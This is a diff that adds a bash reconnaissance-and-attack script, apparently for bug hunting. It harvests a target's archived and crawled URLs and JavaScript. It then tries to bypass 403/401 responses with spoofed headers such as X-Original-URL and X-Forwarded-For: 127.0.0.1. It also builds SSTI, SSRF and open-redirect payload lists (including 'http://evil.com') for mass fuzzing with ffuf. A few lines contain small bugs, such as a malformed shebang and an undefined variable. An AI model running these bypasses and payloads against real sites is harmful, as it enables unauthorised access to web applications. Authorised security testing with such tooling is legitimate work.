@@ -1,0 +1,110 @@
+#!/bin bash 
+
+function crl(){
+mkdir -p ./output_$1
+echo -ne "curl  $1"\\r
+filename=$(echo "$1" | sha256sum |awk '{print $1}')
+curl -sL  $1 -m 3 -o ./output_$1/$filename &>/dev/null
+echo "$1     $filename" >> ./output/index
+}
+
+
+function wk_url(){
+        #get urls
+        cat ../scope |waybackurls |tee -a url
+        cat ../scope |gau -subs   |tee -a url
+        cat url |grep -viE "(jpg|jpej|gif|css|tif|tiff|png|ttf|woff|woff2|ico|svg)$" |sort -u -o url
+
+}
+
+
+function crowl(){
+	echo -e "crowl: \e[32m$1 \e[0m \ndeep: \e[32m  55555 \e[0m" 
+	cat Hosts > new.txt
+
+	cat new.txt url |sort -u -o new.txt 
+
+	export -f crl
+
+	touch paths.txt
+
+	for i in $(seq  5);do
+		cat new.txt |xargs -n 1 -P 10 -I {} bash -c 'crl "$@"' _ {}
+		find ./output/ -type f| grep -oirahE "https?://[^\"\\'> ]+" |grep -viE "(jpg|jpej|gif|css|tif|tiff|png|ttf|woff|woff2|ico|svg)$" |sort -u >urls.txt
+		comm --nocheck-order -13 paths.txt urls.txt > new.txt
+		cat urls.txt >paths.txt
+	done
+
+	cat paths.txt url |sort -u -o url
+	rm -rf new.txt urls.txt paths.txt
+}
+
+function  js_fetch(){
+	cat ./url |grep -iE ".js$" |sort -u -o ./js
+	export -f crl 
+	cat ./js |xargs -n 1 -P 300 -I {}  bash -c ' crl "$@"' _ {}
+	find ./output_js/ -type f |grep -oirahE "https?://[^\"\\'> ]+" |grep -viE "(jpg|jpej|gif|css|tif|tiff|png|ttf|woff|woff2|ico|svg)$"   >> url
+	cat url |sort -u -o url
+}
+
+function bypass(){
+        path=$(echo $1  | unfurl format %p?%q)
+        url= $(echo $1  | unfurl format %s://%d)
+        echo "$1"   | httpx -H  "Referer: $i "           -mc 200  -retries 2 |tee -a 403_bypass.txt
+        echo "$1"   | httpx -H  "X-Original-URL: $path"  -mc 200  -retries 2 |tee -a 403_bypass.txt
+        echo "$url" | httpx -H  "X-Original-URL: $path"  -mc 200  -retries 2 |tee -a 403_bypass.txt
+        echo "$1"   | httpx -H  "X-Rwrite-URL: $path"    -mc 200  -retries 2 |tee -a 403_bypass.txt
+        echo "$url" | httpx -H  "X-Rwrite-URL: $path"    -mc 200  -retries 2 |tee -a 403_bypass.txt
+        echo "$1"   | httpx -H  "Content-Length: 0" -x Post    -mc 200  -retries 2 |tee -a 403_bypass.txt
+        echo "$1"   | httpx  -x Post    -mc 200  -retries 2 |tee -a 403_bypass.txt
+
+        echo "$url" | httpx -H  "X-Client-IP: 127.0.0.1"      -mc 200  -retries 2 |tee -a 403_bypass.txt
+        echo "$url" | httpx -H  "X-Remote-IP: 127.0.0.1"      -mc 200  -retries 2 |tee -a 403_bypass.txt
+        echo "$url" | httpx -H  "X-Remote-Addr: 127.0.0.1"    -mc 200  -retries 2 |tee -a 403_bypass.txt
+        echo "$url" | httpx -H  "X-Host: 127.0.0.1"           -mc 200  -retries 2 |tee -a 403_bypass.txt
+        echo "$url" | httpx -H  "X-Forwarded-For: 127.0.0.1"  -mc 200  -retries 2 |tee -a 403_bypass.txt
+        echo "$url" | httpx -H  "X-Forwarded-Host: 127.0.0.1" -mc 200  -retries 2 |tee -a 403_bypass.txt
+        echo "$url" | httpx -H  "X-Originating-IP: 127.0.0.1"  -mc 200  -retries 2 |tee -a 403_bypass.txt
+
+}
+
+function bps(){
+	cat url | httpx -status-code -threads 500 -retries 2 -o ./status.txt
+	cat  ./status.txt | grep -E  "403|401" |cut  -d " " -f 1 |sort -u -o 40x_urls.txt
+	export -f  bypass
+	cat  40x_urls.txt |xargs -n1 -P 300  -I{} bash -c 'bypass "$@"' _ {}
+}
+
+function create_wl(){
+        #get url with parameters
+        cat url |grep -E  "=|\&" |tee -a url.param
+        #create ssti template
+        cat url.param |qsreplace "ssti{{7*7}}" |tee -a url.ssti
+        cat url.ssti |sort -u -o url.ssti
+        #create ssrf template
+        cat url.param |qsreplace "http://$1"  |tee -a url.ssrf
+        cat url.ssrf |sort -u -o url.ssrf
+        #create open redirect template
+        cat url.param |qsreplace "http://evil.com"  |tee -a url.redirect
+        cat url.redirect |sort -u -o url.redirect
+}
+
+#### main ##################
+mkdir -p url
+cd url
+cp ../Hosts ./
+
+wk_url
+
+crowl ./Hosts
+
+js_fetch 
+
+#bps
+
+#create_wl $1
+#ffuf -u FUZZ -w ./url.ssti      -t 300  -mr "ssti49"    -o  ssti.result
+#ffuf -u FUZZ -w ./url.redirect  -t 300  -mr "evil.com"  -o  open_redirect.result
+#ffuf -u FUZZ -w ./url.ssrf  -t 300  -o  ssrf.result
+#ffuf -u FUZZ -w ./url -H "Host: $1"  -t 300  -o  host.result
+
